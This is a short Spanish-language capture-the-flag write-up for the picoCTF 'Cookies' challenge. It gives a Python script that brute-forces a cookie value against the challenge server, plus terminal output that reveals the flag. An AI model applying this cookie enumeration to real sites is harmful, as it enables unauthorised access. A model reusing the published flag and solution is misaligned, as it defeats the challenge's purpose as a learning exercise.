### 🚩 [Cookies]

**Descripción:** ¿Cuál es el objetivo principal del reto o la vulnerabilidad a explotar?
Who doesn't love cookies? Try to figure out the best one
*Solucion* 
Aqui lo primero que hice fue encender la pagina para despues entrat a la pagina y me puse a inspeccionar los elementos hasta meterme a las cookies y que si cambiaba los valores me salia una pagina diferenbte y probe varios valores pero no era la mejor opccion entonces hice un script en python para solucionarlo rapido  
`import requests
import re

url = "http://wily-courier.picoctf.net:61873/check"

print("Iniciando la búsqueda de la bandera...")

Iteramos sobre los primeros 30 valores 
for i in range(30):
    cookies = {'name': str(i)}
    response = requests.get(url, cookies=cookies)
    
    # Verificamos si la bandera está en el HTML devuelto
    if "picoCTF{" in response.text:
        print(f"\n[+] ¡Éxito! El servidor aceptó la cookie con el valor: {i}")
        
        # Extraemos solo la bandera usando regex
        match = re.search(r'picoCTF\{.*?\}', response.text)
        if match:
            print(f"[+] Bandera encontrada: {match.group(0)}")
        else:
            print("[!] La bandera está en el texto pero falló la extracción. Revisa la respuesta completa.")
        break
    else:
        # Mostramos el progreso en la misma línea
        print(f"[-] Probando cookie {i}... Sin éxito.", end="\r")`


`┌──(kali㉿kali)-[~/Downloads]
└─$ nano s                             
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 s              
Iniciando la búsqueda de la bandera...
[-] Probando cookie 17... Sin éxito.
[+] ¡Éxito! El servidor aceptó la cookie con el valor: 18
[+] Bandera encontrada: picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
`

[picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
